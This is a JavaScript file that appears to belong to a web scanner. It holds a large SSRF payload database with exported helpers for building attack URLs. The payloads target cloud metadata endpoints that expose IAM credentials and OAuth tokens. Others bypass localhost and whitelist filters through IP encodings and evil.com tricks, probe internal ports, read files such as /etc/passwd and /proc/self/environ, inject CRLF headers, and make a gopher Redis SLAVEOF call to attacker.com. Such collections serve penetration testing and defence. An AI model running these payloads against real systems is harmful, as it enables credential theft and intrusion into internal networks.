// SSRF (Server-Side Request Forgery) Payloads
// Comprehensive payload database for SSRF attacks

const SSRFPayloads = {
    // Localhost Access
    localhost: [
        'http://localhost/admin',
        'http://127.0.0.1/admin',
        'http://127.0.0.1:80/admin',
        'http://127.0.0.1:8080/admin',
        'http://0.0.0.0/admin',
        'http://0/admin',
        'http://[::1]/admin',
        'http://localhost.localdomain/admin',
        'http://127.1/admin',
        'http://127.0.1/admin'
    ],

    // Internal Network
    internalNetwork: [
        'http://192.168.0.1/admin',
        'http://192.168.1.1/admin',
        'http://192.168.1.100/api',
        'http://10.0.0.1/admin',
        'http://10.0.0.100/api',
        'http://172.16.0.1/admin',
        'http://172.16.1.1/api',
        'http://internal.server/api',
        'http://intranet/admin',
        'http://192.168.0.0/16'
    ],

    // Cloud Metadata
    cloudMetadata: [
        // AWS
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/dynamic/instance-identity/',
        // Azure
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token',
        // GCP
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://metadata/computeMetadata/v1/',
        // DigitalOcean
        'http://169.254.169.254/metadata/v1.json'
    ],

    // Port Scanning
    portScan: [
        'http://localhost:22',
        'http://localhost:80',
        'http://localhost:443',
        'http://localhost:3306',
        'http://localhost:5432',
        'http://localhost:6379',
        'http://localhost:8080',
        'http://localhost:9200',
        'http://localhost:27017',
        'http://localhost:11211'
    ],

    // Blacklist Bypass - Localhost
    bypassLocalhost: [
        'http://127.1/admin',
        'http://127.0.1/admin',
        'http://127.00.00.01/admin',
        'http://127.0.0.1.nip.io/admin',
        'http://127.0.0.1.xip.io/admin',
        'http://2130706433/admin',  // Decimal IP
        'http://0x7f000001/admin',  // Hex IP
        'http://0177.0000.0000.0001/admin',  // Octal IP
        'http://0x7f.0x0.0x0.0x1/admin',
        'http://localhost:80@127.0.0.1/admin'
    ],

    // Whitelist Bypass
    bypassWhitelist: [
        'http://trusted.com@evil.com/',
        'http://evil.com#trusted.com',
        'http://trusted.com.evil.com/',
        'http://evil.com/trusted.com',
        'http://evil.com?trusted.com',
        'http://trusted.com:80@evil.com/',
        'http://evil.com#@trusted.com',
        'http://trusted.com%2F@evil.com/',
        'http://trusted.com%00.evil.com/',
        'http://trusted.com%252F@evil.com/'
    ],

    // Open Redirect
    openRedirect: [
        'http://trusted.com/redirect?url=http://localhost/admin',
        'http://trusted.com/redirect?url=http://127.0.0.1/admin',
        'http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/',
        'http://trusted.com/redirect?next=http://localhost/admin',
        'http://trusted.com/redirect?return=http://localhost/admin',
        'http://trusted.com/redirect?continue=http://localhost/admin',
        'http://trusted.com/redirect?dest=http://localhost/admin',
        'http://trusted.com/redirect?target=http://localhost/admin',
        'http://trusted.com/redirect?redir=http://localhost/admin',
        'http://trusted.com/redirect?redirect_uri=http://localhost/admin'
    ],

    // DNS Rebinding
    dnsRebinding: [
        'http://spoofed.burpcollaborator.net/',
        'http://1ocalhost.com/',
        'http://127.0.0.1.nip.io/',
        'http://127.0.0.1.xip.io/',
        'http://127.0.0.1.sslip.io/',
        'http://localtest.me/',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io/',
        'http://mail.ebc.apple.com/',
        'http://bugbounty.dod.network/',
        'http://www.example.com.127.0.0.1.nip.io/'
    ],

    // Protocol Smuggling
    protocolSmuggling: [
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'file:///proc/self/environ',
        'gopher://localhost:25/xHELO%20localhost',
        'gopher://localhost:6379/_SLAVEOF%20attacker.com%206379',
        'dict://localhost:11211/stats',
        'dict://localhost:6379/info',
        'ftp://localhost/',
        'tftp://localhost/',
        'ldap://localhost:389'
    ],

    // URL Encoding Bypass
    encodingBypass: [
        'http://127.0.0.1%2F@evil.com/',
        'http://127.0.0.1%00.evil.com/',
        'http://127.0.0.1%252F@evil.com/',
        'http://127.0.0.1%23@evil.com/',
        'http://127.0.0.1%3F@evil.com/',
        'http://127.0.0.1%26@evil.com/',
        'http://%31%32%37%2e%30%2e%30%2e%31/',  // URL encoded
        'http://127.0.0.1%09/admin',
        'http://127.0.0.1%0a/admin',
        'http://127.0.0.1%0d/admin'
    ],

    // IPv6 Bypass
    ipv6Bypass: [
        'http://[::1]/admin',
        'http://[::ffff:127.0.0.1]/admin',
        'http://[0:0:0:0:0:ffff:127.0.0.1]/admin',
        'http://[::ffff:7f00:1]/admin',
        'http://[::1]:80/admin',
        'http://[0000::1]/admin',
        'http://[0:0:0:0:0:0:0:1]/admin',
        'http://[::]/admin',
        'http://[::ffff:169.254.169.254]/latest/meta-data/',
        'http://[::ffff:a9fe:a9fe]/latest/meta-data/'
    ],

    // CRLF Injection
    crlfInjection: [
        'http://127.0.0.1%0d%0aSet-Cookie:%20admin=true',
        'http://127.0.0.1%0d%0aLocation:%20http://evil.com',
        'http://127.0.0.1%0aSet-Cookie:%20admin=true',
        'http://127.0.0.1%0dSet-Cookie:%20admin=true',
        'http://127.0.0.1%0d%0a%0d%0a<script>alert(1)</script>',
        'http://127.0.0.1%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK',
        'http://127.0.0.1%0d%0aX-Forwarded-For:%20127.0.0.1',
        'http://127.0.0.1%0d%0aHost:%20evil.com',
        'http://127.0.0.1%0d%0aConnection:%20close',
        'http://127.0.0.1%0d%0a%0d%0aGET%20/admin%20HTTP/1.1'
    ]
};

// Common ports to scan
const CommonPorts = [
    { port: 22, service: 'SSH' },
    { port: 80, service: 'HTTP' },
    { port: 443, service: 'HTTPS' },
    { port: 3306, service: 'MySQL' },
    { port: 5432, service: 'PostgreSQL' },
    { port: 6379, service: 'Redis' },
    { port: 8080, service: 'HTTP-Alt' },
    { port: 9200, service: 'Elasticsearch' },
    { port: 27017, service: 'MongoDB' },
    { port: 11211, service: 'Memcached' }
];

// Cloud metadata endpoints
const CloudMetadataEndpoints = {
    aws: [
        '/latest/meta-data/',
        '/latest/meta-data/hostname',
        '/latest/meta-data/iam/security-credentials/',
        '/latest/user-data/',
        '/latest/dynamic/instance-identity/document'
    ],
    azure: [
        '/metadata/instance?api-version=2021-02-01',
        '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
    ],
    gcp: [
        '/computeMetadata/v1/',
        '/computeMetadata/v1/instance/service-accounts/default/token',
        '/computeMetadata/v1/project/project-id'
    ]
};

// Helper functions
function getPayloadsByType(type) {
    return SSRFPayloads[type] || [];
}

function getAllSSRFPayloads() {
    const allPayloads = [];
    Object.keys(SSRFPayloads).forEach(key => {
        if (Array.isArray(SSRFPayloads[key])) {
            allPayloads.push(...SSRFPayloads[key]);
        }
    });
    return allPayloads;
}

function getPayloadCount() {
    return getAllSSRFPayloads().length;
}

function buildSSRFURL(baseUrl, paramName, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(paramName, payload);
    return url.toString();
}

function generatePortScanPayloads(host = 'localhost') {
    return CommonPorts.map(p => `http://${host}:${p.port}`);
}

function generateCloudMetadataPayloads(provider = 'aws') {
    const baseIP = '169.254.169.254';
    const endpoints = CloudMetadataEndpoints[provider] || CloudMetadataEndpoints.aws;
    return endpoints.map(endpoint => `http://${baseIP}${endpoint}`);
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        SSRFPayloads,
        CommonPorts,
        CloudMetadataEndpoints,
        getPayloadsByType,
        getAllSSRFPayloads,
        getPayloadCount,
        buildSSRFURL,
        generatePortScanPayloads,
        generateCloudMetadataPayloads
    };
}
